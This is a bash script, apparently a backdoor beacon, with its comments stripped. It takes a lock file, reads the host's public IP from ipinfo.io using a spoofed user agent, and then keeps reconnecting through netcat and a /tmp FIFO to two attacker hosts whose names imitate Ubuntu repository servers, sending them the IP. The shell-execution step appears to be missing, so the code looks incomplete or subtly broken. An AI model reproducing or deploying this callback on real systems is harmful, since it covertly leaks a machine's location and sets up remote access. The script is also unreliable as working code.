#!/usr/bin/env bash

LOCKFILE="/tmp/cached_script.lock"
PRIMARY_HOST="ubuntu-repo.strangled.net"
PRIMARY_PORT=8090
BACKUP_HOST="linux-x86-tcpudp.strangled.net"
BACKUP_PORT=21

# 
check_and_acquire_lock() {
    if [ -f "$LOCKFILE" ]; then
        LOCAL_PID=$(cat "$LOCKFILE" 2>/dev/null)
        if [ -n "$LOCAL_PID" ] && kill -0 "$LOCAL_PID" 2>/dev/null; then
            # Process is already running safely on the target environment, exit cleanly
            exit 0
        fi
    fi
    echo $$ > "$LOCKFILE"
}

remove_lock() {
    rm -f "$LOCKFILE"
}

# 
trap remove_lock EXIT INT TERM

#
check_and_acquire_lock

# 
TRUE_IP="Unknown_IP"
if command -v curl >/dev/null 2>&1; then
    # 
    TRUE_IP=$(curl -s -m 4 -A "curl/7.68.0" http://ipinfo.io | grep -o '"ip":[^,]*' | cut -d'"' -f4)
elif command -v wget >/dev/null 2>&1; then
    TRUE_IP=$(wget -qO- --timeout=4 --user-agent="curl/7.68.0" http://ipinfo.io | grep -o '"ip":[^,]*' | cut -d'"' -f4)
fi

[ -z "$TRUE_IP" ] && TRUE_IP="Unknown_IP"

# 
while true; do
    # 
    rm -f /tmp/p
    mkfifo /tmp/p

    #
    if nc -z -w 3 "$PRIMARY_HOST" "$PRIMARY_PORT" >/dev/null 2>&1; then
        # 
        (echo -e "$TRUE_IP"; cat /tmp/p) | nc "$PRIMARY_HOST" "$PRIMARY_PORT" >/tmp/p 2>&1 &
        NC_PID=$!
    else
        # 
        (echo -e "$TRUE_IP"; cat /tmp/p) | nc "$BACKUP_HOST" "$BACKUP_PORT" >/tmp/p 2>&1 &
        NC_PID=$!
    fi

    # 
    while kill -0 "$NC_PID" >/dev/null 2>&1; do
        sleep 5
    done

    # 
    rm -f /tmp/p
    sleep 5
done
